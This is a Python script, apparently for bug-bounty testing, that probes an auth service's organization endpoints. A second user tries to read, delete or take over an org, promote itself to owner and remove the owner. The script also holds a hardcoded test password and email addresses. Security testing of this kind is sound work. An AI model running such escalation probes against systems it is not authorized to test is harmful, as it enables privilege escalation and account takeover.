# -*- coding: utf-8 -*-
"""W4c: Neon Auth organization-plugin multi-user authz matrix.
Setup: U1 owns org O1 (created in W4b). U2 = second self-registered user.
All users/orgs are self-created inside our own auth directory (in scope).

Stages:
 A sessions: U1 sign-in, U2 sign-up+sign-in
 B route discovery (U1): get-members / members / invite-member shapes
 C cross-user probes while U2 is NOT a member of O1:
    C1 U2 read O1 members?            (IDOR read)
    C2 U2 update O1 owner role?       (privilege change)
    C3 U2 delete O1?                  (destructive)
    C4 U2 leave O1?                   (memberless leave)
 D after owner invites U2 (member role):
    D1 U2 read members (legit) / list
    D2 U2 self-promote owner?         (role escalation)
    D3 U2 remove owner U1?            (owner removal)
    D4 U2 rename O1 / update O1?
 E cleanup: U1 deletes O1 (if still owner), else report.
X-Bug-Bounty: xxbo on control-plane only; NA is our own auth service.
"""
import json
import ssl
import time
import http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
LOG = r"F:\scan\neon_report\_w4c_out.txt"
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"


def out(s):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), s)
    print(line, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(line + "\n")


def na(method, path, body=None, cookie=None, timeout=30):
    try:
        ctx = ssl.create_default_context()
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.6)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.6)
        return None, str(e)[:150], ""


def signin(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    if st in (200, 201):
        return ck.split(";")[0]
    return None


def signup(email, name):
    st, data, ck = na("POST", "/neondb/auth/sign-up/email",
                      {"email": email, "password": PASS, "name": name})
    if st in (200, 201):
        return ck.split(";")[0]
    return None


def call(tag, method, path, body, cookie, q=None):
    p = path
    if q:
        import urllib.parse
        p = path + "?" + urllib.parse.urlencode(q)
    st, data, _ = na(method, p, body, cookie)
    verdict = ""
    if st == 200:
        try:
            j = json.loads(data)
            verdict = j.get("error") or j.get("code") or ""
        except Exception:
            verdict = ""
    out("%-38s %-5s -> %s %s%s" % (tag, method, st, verdict, data[:170]))
    return st, data


def main():
    out("== W4c org matrix ==")
    c1 = signin(U1)
    out("U1 session: %s" % bool(c1))
    c2 = signup(U2, "w4c-user2") or signin(U2)
    out("U2 session: %s" % bool(c2))
    if not c1 or not c2:
        out("ABORT no sessions")
        return

    # find O1 id (U1 list)
    st, data, _ = na("GET", "/neondb/auth/organization/list", None, c1)
    orgs = []
    if st == 200:
        try:
            j = json.loads(data)
            orgs = j if isinstance(j, list) else j.get("organizations", [])
        except Exception:
            pass
    o1 = orgs[0]["id"] if orgs else None
    out("U1 orgs: %s" % [o.get("name") for o in orgs])
    if not o1:
        out("ABORT no org; create one")
        st, data, _ = na("POST", "/neondb/auth/organization/create",
                         {"name": "w4c-org", "slug": "w4c-org-%d" % int(time.time())}, c1)
        out("create: %s %s" % (st, data[:150]))
        o1 = json.loads(data).get("id")
    out("O1 = %s" % o1)

    # owner member id (dynamic)
    owner_mid = None
    st, data, _ = na("GET", "/neondb/auth/organization/get-members?organizationId=%s" % o1,
                     None, c1)
    out("B members raw: %s %s" % (st, data[:500]))
    try:
        mlist = json.loads(data).get("members", [])
        for m in mlist:
            if m.get("role") == "owner":
                owner_mid = m.get("id") or (m.get("user") or {}).get("id")
                break
    except Exception:
        pass
    out("owner member id: %s" % owner_mid)

    # C: U2 cross probes (not a member)
    call("C1 U2 read members", "GET", "/neondb/auth/organization/get-members", None, c2,
         {"organizationId": o1})
    call("C2 U2 update role", "POST", "/neondb/auth/organization/update-member-role",
         {"organizationId": o1, "memberId": owner_mid,
          "role": "owner"}, c2)
    call("C3 U2 delete O1", "POST", "/neondb/auth/organization/delete",
         {"organizationId": o1}, c2)
    call("C4 U2 leave O1", "POST", "/neondb/auth/organization/leave",
         {"organizationId": o1}, c2)

    # D: invite flow U1 -> U2 (member)
    call("D invite U2", "POST", "/neondb/auth/organization/invite-member",
         {"organizationId": o1, "email": U2, "role": "member"}, c1)
    # list U2 invitations
    st, data, _ = na("GET", "/neondb/auth/organization/list-invitations", None, c2)
    out("D U2 invitations: %s %s" % (st, data[:300]))
    inv_id = None
    try:
        invs = json.loads(data).get("invitations", [])
        if invs:
            inv_id = invs[0].get("id")
    except Exception:
        pass
    if inv_id:
        call("D accept invite", "POST", "/neondb/auth/organization/accept-invitation",
             {"invitationId": inv_id}, c2)
    else:
        out("D no invitation listed - try get-invitation by id later")

    # after member: escalation probes
    call("D1 U2 read members now", "GET",
         "/neondb/auth/organization/get-members?organizationId=%s" % o1, None, c2)
    call("D2 U2 self promote", "POST", "/neondb/auth/organization/update-member-role",
         {"organizationId": o1, "memberId": "SELF", "role": "owner"}, c2)
    call("D3 U2 remove U1", "POST", "/neondb/auth/organization/remove-member",
         {"organizationId": o1, "memberId": owner_mid}, c2)
    call("D4 U2 rename", "POST", "/neondb/auth/organization/rename",
         {"organizationId": o1, "name": "w4c-hijack"}, c2)
    # verify ownership state
    st, data, _ = na("GET",
                     "/neondb/auth/organization/get-members?organizationId=%s" % o1,
                     None, c1)
    out("E verify U1 members (fresh): %s %s" % (st, data[:400]))
    out("== W4c DONE")


if __name__ == "__main__":
    main()
